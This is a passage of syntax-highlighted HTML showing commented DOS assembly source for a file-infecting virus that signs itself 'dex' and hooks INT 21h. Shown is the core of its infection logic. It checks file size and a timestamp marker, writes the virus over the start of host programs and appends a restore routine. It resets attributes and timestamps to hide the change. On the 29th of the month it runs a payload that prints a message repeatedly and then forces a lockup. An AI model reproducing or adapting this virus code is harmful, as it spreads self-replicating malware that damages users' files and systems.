     </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">j2</span><span class="sc0">                       </span><span class="sc1">;yes, continue with checks</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc0">                 </span><span class="sc1">;no, dont infect</span><span class="sc0">
</span><span class="sc5">j2</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">62000</span><span class="sc0">                 </span><span class="sc1">;is length &lt; 62000?</span><span class="sc0">
     </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">j3</span><span class="sc0">                       </span><span class="sc1">;yes, continue with checks</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc0">                 </span><span class="sc1">;no, dont infect</span><span class="sc0">
</span><span class="sc5">j3</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc2">096h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;set ax to file's time stamp</span><span class="sc0">
     </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000011111b</span><span class="sc0">     </span><span class="sc1">;clear everything but seconds</span><span class="sc0">
     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000010100b</span><span class="sc0">     </span><span class="sc1">;is seconds = 40?</span><span class="sc0">
     </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">j4</span><span class="sc0">                       </span><span class="sc1">;yes, continue with infection</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02ah</span><span class="sc0">                  </span><span class="sc1">;no, set ah to get the date</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;get current system date</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">21</span><span class="sc0">                    </span><span class="sc1">;set cx to 21</span><span class="sc0">
     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">29</span><span class="sc0">                    </span><span class="sc1">;is the date the 29th?</span><span class="sc0">
     </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">irritate</span><span class="sc0">                  </span><span class="sc1">;yes, continue with irritate</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc0">                 </span><span class="sc1">;no, let program execute normally</span><span class="sc0">


</span><span class="sc5">irritate</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data5</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc0">    </span><span class="sc1">;point dx to irritating message</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                   </span><span class="sc1">;set ah to write to screen</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;write message 21 times</span><span class="sc0">
     </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">irritate</span><span class="sc0">
     </span><span class="sc6">iret</span><span class="sc0">                         </span><span class="sc1">;xfer program control to whatever's on</span><span class="sc0">
                                  </span><span class="sc1">;the stack (this almost guarantee's a</span><span class="sc0">
                                  </span><span class="sc1">;lockup and a reboot)</span><span class="sc0">


</span><span class="sc5">j4</span><span class="sc4">:</span><span class="sc0"> 
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc2">096h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;set ax equal to the file's time stamp</span><span class="sc0">
     </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1111111111100000b</span><span class="sc0">     </span><span class="sc1">;zero the seconds portion</span><span class="sc0">
     </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000010100b</span><span class="sc0">      </span><span class="sc1">;set the seconds = 40</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                 </span><span class="sc1">;set bx = loc for restore routine (end</span><span class="sc0">
                                  </span><span class="sc1">;of file once its in memory)      </span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc5">data1</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">;store this value in the virus</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;set bx = to adjusted time stamp</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">;get the original ds</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;store this value back</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04300h</span><span class="sc0">                </span><span class="sc1">;set ax to get the file's attributes</span><span class="sc0">
                                  </span><span class="sc1">;ds:dx already points to path/filename</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;get the files attributes</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;push the attributes</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;push the adjusted time stamp</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;zero cx(attributes for normal, read/write)</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04301h</span><span class="sc0">                </span><span class="sc1">;set ax to set file attributes</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;set files attributes to normal/read/write</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03d02h</span><span class="sc0">                </span><span class="sc1">;set ax to open file</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;open file for read/write access</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;mov file handle to bx</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;push current code segment</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">;and pop into ds (ds=cs)</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endcode</span><span class="sc4">-</span><span class="sc5">begin</span><span class="sc0">         </span><span class="sc1">;set cx equal to length of virus</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endcode</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc0">  </span><span class="sc1">;point dx to end of virus in memory</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc0">                  </span><span class="sc1">;set ah to read from file</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;read bytes from beginning of file and</span><span class="sc0">
                                  </span><span class="sc1">;store at end of virus.  Read as many bytes</span><span class="sc0">
                                  </span><span class="sc1">;as virus is long.</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;zero cx</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">;zero dx</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04200h</span><span class="sc0">                </span><span class="sc1">;set ax to move file pointer from begin</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;mov file pointer to start of file</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endcode</span><span class="sc4">-</span><span class="sc5">begin</span><span class="sc0">         </span><span class="sc1">;set cx = length of virus</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                 </span><span class="sc1">;point dx to start of virus</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">                  </span><span class="sc1">;set ah to write to file</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;write virus to start of file</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;zero cx</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">;zero dx</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04202h</span><span class="sc0">                </span><span class="sc1">;set ax to move file pointer from end</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;mov file pointer to end of file</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">checkinfect</span><span class="sc4">-</span><span class="sc5">restcode</span><span class="sc0">  </span><span class="sc1">;set cx to length of restore routine</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">restcode</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc0"> </span><span class="sc1">;point dx to start of restore routine</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">                  </span><span class="sc1">;set ah to write to file</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;write restore routine to end of file</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endcode</span><span class="sc4">-</span><span class="sc5">begin</span><span class="sc0">         </span><span class="sc1">;set cx to length of virus (length of code</span><span class="sc0">
                                  </span><span class="sc1">;read from beginning of file)</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endcode</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc0">  </span><span class="sc1">;point dx to data read from file</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">                  </span><span class="sc1">;set ah to write to file</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;write data read from start of file to end</span><span class="sc0">
                                  </span><span class="sc1">;of file following restore routine</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;pop the adjusted time stamp</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc2">098h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;mov the file date stamp into dx</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05701h</span><span class="sc0">                </span><span class="sc1">;set ax to write time/date stamp</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;write time/date stamp to file</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc0">                  </span><span class="sc1">;set ah to close file</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;close the file</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;pop the original attributes</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">;pop the original ds</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;pop the original dx</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;push these values back</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04301h</span><span class="sc0">                </span><span class="sc1">;set ax to set file attributes (ds:dx now</span><span class="sc0">
                                  </span><span class="sc1">;points to original path/filename)</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;set the original attributes back to file</span><span class="sc0">


</span><span class="sc5">endvirus</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;virus execution complete. restore original</span><span class="sc0">
                                  </span><span class="sc1">;values for INT 21 function</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc5">cont</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;virus complete.  restore original flags</span><span class="sc0">
     </span><span class="sc6">popf</span><span class="sc0">
     </span><span class="sc6">pushf</span><span class="sc0">


</span><span class="sc5">int21trap</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;this calls the original INT 21 routine</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">09ah</span><span class="sc0">                      </span><span class="sc1">;opcode for a far call</span><span class="sc0">
     </span><span class="sc6">nop</span><span class="sc0">                          </span><span class="sc1">;blank area.  the original INT 21 vector</span><span class="sc0">
     </span><span class="sc6">nop</span><span class="sc0">                          </span><span class="sc1">;is copied to this area</span><span class="sc0">
     </span><span class="sc6">nop</span><span class="sc0">
     </span><span class="sc6">nop</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;after the original INT 21 routine has</span><span class="sc0">
                                  </span><span class="sc1">;completed execution, control is returned</span><span class="sc0">
                                  </span><span class="sc1">;to this point </span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
     </span><span class="sc6">pushf</span><span class="sc0">                        </span><span class="sc1">;push the flags returned from the INT 21</span><span class="sc0">
                                  </span><span class="sc1">;routine.  We have to get them in the</span><span class="sc0">
                                  </span><span class="sc1">;proper location in the stack when we </span><span class="sc0">
                                  </span><span class="sc1">;return to the calling program</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;pop the flags</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                    </span><span class="sc1">;set bx equal to the stack pointer</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">;copy the flags to the proper location in</span><span class="sc0">
                                  </span><span class="sc1">;the stack</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">;restore bx</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;restore ax</span><span class="sc0">
     </span><span class="sc6">iret</span><span class="sc0">                         </span><span class="sc1">;return to calling program</span><span class="sc0">


</span><span class="sc5">signature</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'dex'</span><span class="sc0">


</span><span class="sc5">endcode</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;this file has been written as if it were</span><span class="sc0">
                                  </span><span class="sc1">;a natural infection.  At this point the</span><span class="sc0">
                                  </span><span class="sc1">;virus is ended and we are at the restore</span><span class="sc0">
                                  </span><span class="sc1">;routine.  Following this is the host code</span><span class="sc0">
                                  </span><span class="sc1">;which will be moved back to 0100h.  This</span><span class="sc0">
                                  </span><span class="sc1">;file could never actually be a natural </span><span class="sc0">
                                  </span><span class="sc1">;infection however due to its small size</span><span class="sc0">
     </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                    </span><span class="sc1">;start of restore routine.  move host back</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;set up to xfer to cs:0100h</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;zero ax</span><span class="sc0">
     </span><span class="sc6">ret</span><span class="sc0">                          </span><span class="sc1">;host is restored.  xfer to start of host</span><span class="sc0">
</span><span class="sc5">hoststart</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;This is the host program.  It consists</span><span class="sc0">
                                  </span><span class="sc1">;merely of a simple message being displayed</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">skipdata</span><span class="sc0">                 </span><span class="sc1">;jump over message</span><span class="sc0">
</span><span class="sc5">hostmessage</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'The virus is now resident.$'</span><span class="sc0">
</span><span class="sc5">skipdata</span><span class="sc4">:</span><span class="sc0">                
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                   </span><span class="sc1">;set ah to write to screen</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hostmessage</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc0">
                                  </span><span class="sc1">;point dx to message to display</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;display message</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc0">                  </span><span class="sc1">;set ah to terminate program</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;terminate program, return to DOS</span><span class="sc0">
     </span><span class="sc9">END</span><span class="sc0">
</span></div></body>
</html>
